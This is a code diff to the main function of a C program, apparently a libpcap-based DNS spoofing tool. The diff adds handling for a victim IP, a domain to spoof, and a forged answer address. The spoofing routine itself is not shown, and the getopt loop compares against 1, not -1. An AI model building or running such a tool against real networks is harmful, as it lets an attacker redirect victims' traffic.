@@ -223,15 +223,15 @@ void extract_dns_request(struct dnsquery *dns_query, char *request) {
  * Main Function
  */
 int main(int argc, char** argv) {
-    char *dev, *filter = NULL, *victim_ip = NULL, *interface_name = NULL; // Network Device, Filter
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *nic_descr;
-    const u_char *packet;
-    struct pcap_pkthdr pkt_hdr; // defined in pcap.h
-    int loop_ret, c, status;
+    char *filter = NULL;        // PCAP Filter
+    char *victim_ip = NULL;     // Victim Machine
+    char *interface_name = NULL;// Network interface
+    char *request = NULL;       // Domain in the Query
+    char *spoof_address = NULL; // Spoofed Address in the Answer
+    int c, status;
 
-    if (argc < 3) {
-        fprintf(stderr, "Please use -i for Network Interface \nAND -v for Victim IP Address \nOR -h for help");
+    if (argc < 9) {
+        fprintf(stderr, "\nPlease use -i for Network Interface \nAND -v for Victim IP Address \nAND -r for the domain \n AND -a for the spoofed address \nOR -h for help");
     } else {
         while ((c = getopt(argc, argv, "i:v:r:a:h")) != 1) {
             switch (c) {
@@ -242,12 +242,13 @@ int main(int argc, char** argv) {
                     victim_ip = optarg;
                     break;
                 case 'r': // Domain name you want to spoof
+                    request = optarg;
                     break;
                 case 'a': // Address you want to send in the answer
+                    spoof_address = optarg;
                     break;
-                case 'h':
-                    return EXIT_SUCCESS;
                 case '?':
+                    submit_log("%s", "arguments missing");
                     return EXIT_FAILURE;
             }
         }
@@ -258,9 +259,6 @@ int main(int argc, char** argv) {
     }
 
     pcap_setup(filter);
-
-    //strcpy(filter, "udp and port 53 and src ");
-    //strcpy(filter, victim);
 
     return (EXIT_SUCCESS);
 }
